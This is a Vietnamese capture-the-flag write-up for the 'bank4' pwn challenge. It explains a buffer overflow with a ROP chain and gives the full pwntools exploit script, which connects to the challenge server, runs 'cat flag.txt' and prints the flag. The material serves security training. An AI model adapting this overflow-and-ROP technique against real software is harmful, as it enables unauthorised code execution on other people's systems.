## ⚡ [bank4](https://ctf.hcmus.edu.vn/challenges#bank4-11)

[![df](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)
[![df](https://img.shields.io/badge/member-viplazy-brightgreen.svg)](https://img.shields.io/badge/member-viplazy-brightgreen.svg)
[![df](https://img.shields.io/badge/136-pts-brightgreen.svg)](https://img.shields.io/badge/136-pts-brightgreen.svg)

Tác giả: `xikhud`

Tags: `pwn` `bof` `rop`

### Summary

Chạy thử chương trình thì thấy nó giống challange `bank1` trước đó, lần này thì ta có thêm file binary.

Tìm thấy hàm các hàm như sau:

```c
void getFlag(void)
{
  if ((o1 == 0) || (o2 == 0)) {
    system("echo \"hcmasd-cft{nah_nah_nah_not_today}\"");
  }
  else {
    system("cat flag.txt");
  }
  return;
}

void up1(int arg1,int arg2)
{
  if (((o2 != 0) && (arg1 == 0x1337)) && (arg2 == 0xdead)) {
    o1 = 1;
  }
  return;
}

void up2(int arg1,int arg2,int arg3)
{
  if ((arg1 == arg2) && (arg3 == 0x12345678)) {
    o2 = 1;
  }
  return;
}
```

### Exploit

Dùng ROP để có thể bypass điều kiện trong hàm `getFlag` bằng cách gọi các hàm `up2` và `up1` trước.

Hàm `up2` cần 3 tham số, nên ta phải pop 3 tham số này ra khỏi stack trước khi có thể gọi hàm tiếp theo:

```bash
$ ROPgadget --binary bank4 --only 'pop|ret' | grep 'eax'
0x0809f87a : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x08056794 : pop eax ; pop edx ; pop ebx ; ret # useful
0x080a9236 : pop eax ; ret
0x0809f879 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
```

Vậy gadget `0x08056794 : pop eax ; pop edx ; pop ebx ; ret` có thể sử dụng được.

Tương tự, hàm `up1` cần 2 tham số:

```bash
$ ROPgadget --binary bank4 --only 'pop|ret' | grep 'edx'
0x08056794 : pop eax ; pop edx ; pop ebx ; ret
0x0806e6ca : pop ebx ; pop edx ; ret # useful
0x08056795 : pop edx ; pop ebx ; ret
0x0806e6f1 : pop edx ; pop ecx ; pop ebx ; ret
0x0806e6cb : pop edx ; ret
```

Vậy gadget `0x0806e6ca : pop ebx ; pop edx ; ret` có thể sử dụng được.

**Xây dựng payload.**

- Offset của buffer là 80:
  `payload = "A"*80`

- Gọi hàm up2:
  Hàm này yêu cầu 2 biến ban đầu là giống nhau, biến thứ 3 có giá trị `0x12345678`.
  `payload += up2_addr + pop_eax_edx_ebx_ret + arg2_1 + arg2_2 + 0x12345678` 

  Trong đó, `arg2_1 = arg2_2 = 0x080da724`

- Gọi hàm up1 tương tự:
  `payload += up1_addr + pop_ebx_edx_ret + arg1_1 + arg1_2` 

  Trong đó, `arg1_1=0xffff1337`, `arg1_2=0xffffdead`. Để ý rằng ta thêm `0xffff` vào 2 byte đầu để tránh lỗi đọc kí tự null của `gets()`.

- Gọi hàm `getFlag`:
  `payload += getFlag_addr`
  
### Code

```python
#!/usr/bin/env python3

from pwn import *

bin = ELF("./bank4")

offset = 80

up1_addr = bin.sym["up1"]
arg1_1 = 0xffff1337
arg1_2 = 0xffffdead

up2_addr = bin.sym["up2"]
arg2_1 = arg2_2 = 0x080da724
arg2_3 = 0x12345678

getFlag_addr = bin.sym["getFlag"]

pop_ebx_edx_ret = 0x0806e6ca
pop_eax_edx_ebx_ret = 0x08056794

pl = b'A'*offset
pl = pl + p32(up2_addr) + p32(pop_eax_edx_ebx_ret) + p32(arg2_1) + p32(arg2_2) + p32(arg2_3)
pl = pl + p32(up1_addr) + p32(pop_ebx_edx_ret) + p32(arg1_1) + p32(arg1_2)
pl = pl + p32(getFlag_addr)
  
r = remote("61.28.237.24", 30205)

s = r.recvuntil('[+] Please enter your name: ')

r.sendline(pl)
r.sendline(b'cat flag.txt;echo ;exit')

r.interactive()
```

📫 Flag: **`HCMUS-CTF{trungdeptrai}`**

---
*[Back to table of contents](../README.md)*
